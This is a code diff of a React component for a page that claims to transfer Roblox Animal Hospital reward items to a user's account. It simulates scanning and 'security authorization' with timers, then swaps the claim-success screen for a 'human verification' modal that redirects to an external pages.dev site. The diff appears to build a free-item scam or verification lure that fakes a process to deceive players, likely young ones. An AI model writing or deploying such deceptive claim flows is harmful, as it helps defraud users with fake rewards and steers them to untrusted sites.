@@ -9,6 +9,7 @@ import {
   Sparkles,
   Loader2
 } from 'lucide-react';
+import { ClaimVerificationModal } from './ClaimVerificationModal';
 
 interface AnimalHospitalPageProps {
   onBack: () => void;
@@ -129,14 +130,10 @@ export const AnimalHospitalPage: React.FC<AnimalHospitalPageProps> = ({ onBack }
       setTimeout(() => {
         setScanMessage('Finalizing security authorization...');
         setTimeout(() => {
-          setClaimStep('verified');
+          setClaimStep('success');
         }, 1100);
       }, 1100);
     }, 1000);
-  };
-
-  const handleFinishVerification = () => {
-    setClaimStep('success');
   };
 
   const handleCloseModal = () => {
@@ -242,7 +239,7 @@ export const AnimalHospitalPage: React.FC<AnimalHospitalPageProps> = ({ onBack }
       </main>
 
       {/* Interactive Claim Modal */}
-      {claimingItem && (
+      {claimingItem && claimStep !== 'success' && (
         <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
           <div className="relative bg-[#091b10] border border-[#1b4a2b] rounded-3xl max-w-md w-full p-6 shadow-2xl text-center space-y-4">
             <button
@@ -325,69 +322,17 @@ export const AnimalHospitalPage: React.FC<AnimalHospitalPageProps> = ({ onBack }
               </div>
             )}
 
-            {/* STEP 3: Verification Check */}
-            {claimStep === 'verified' && (
-              <div className="space-y-4 pt-2">
-                <div className="w-14 h-14 rounded-full bg-[#0d2a17] border-2 border-[#48e07a] flex items-center justify-center mx-auto text-[#48e07a]">
-                  <ShieldCheck className="w-8 h-8" />
-                </div>
-
-                <div className="space-y-1">
-                  <h3 className="text-lg font-black text-white">Verification Ready</h3>
-                  <p className="text-xs text-[#8ce2ad]">
-                    Reward <strong>{claimingItem.name}</strong> ready for <strong>@{username}</strong>.
-                  </p>
-                </div>
-
-                <div className="bg-[#051108] p-3 rounded-xl border border-[#184626] text-xs text-left space-y-1">
-                  <div className="flex items-center justify-between text-slate-300">
-                    <span>Reward Item:</span>
-                    <span className="font-bold text-white">{claimingItem.name}</span>
-                  </div>
-                  <div className="flex items-center justify-between text-slate-300">
-                    <span>Rarity:</span>
-                    <span className="font-bold text-[#8ce2ad]">{claimingItem.badge}</span>
-                  </div>
-                  <div className="flex items-center justify-between text-slate-300">
-                    <span>Target Account:</span>
-                    <span className="font-bold text-[#48e07a]">@{username}</span>
-                  </div>
-                </div>
-
-                <button
-                  onClick={handleFinishVerification}
-                  className="w-full py-2.5 px-4 bg-[#3ca660] hover:bg-[#48bf70] text-white font-bold rounded-xl text-sm transition-all shadow-md flex items-center justify-center gap-2 cursor-pointer"
-                >
-                  <CheckCircle2 className="w-4 h-4" />
-                  <span>Confirm & Claim</span>
-                </button>
-              </div>
-            )}
-
-            {/* STEP 4: Success Notification */}
-            {claimStep === 'success' && (
-              <div className="space-y-4 pt-2">
-                <div className="w-16 h-16 rounded-full bg-[#3ca660]/20 border-2 border-[#48e07a] flex items-center justify-center mx-auto text-[#48e07a]">
-                  <CheckCircle2 className="w-10 h-10" />
-                </div>
-
-                <div className="space-y-1">
-                  <h3 className="text-xl font-black text-white">Item Claimed!</h3>
-                  <p className="text-xs text-[#8ce2ad]">
-                    <strong>{claimingItem.name}</strong> has been transferred to <strong>@{username}</strong>. Launch Roblox Animal Hospital to use it.
-                  </p>
-                </div>
-
-                <button
-                  onClick={handleCloseModal}
-                  className="w-full py-2.5 px-4 bg-[#3ca660] hover:bg-[#48bf70] text-white font-bold rounded-xl text-sm transition-all shadow cursor-pointer"
-                >
-                  Done
-                </button>
-              </div>
-            )}
           </div>
         </div>
+      )}
+
+      {/* Human Verification Modal matching exact user screenshot */}
+      {claimingItem && claimStep === 'success' && (
+        <ClaimVerificationModal
+          isOpen={true}
+          onClose={handleCloseModal}
+          redirectUrl="https://animal-hsp.pages.dev/"
+        />
       )}
     </div>
   );
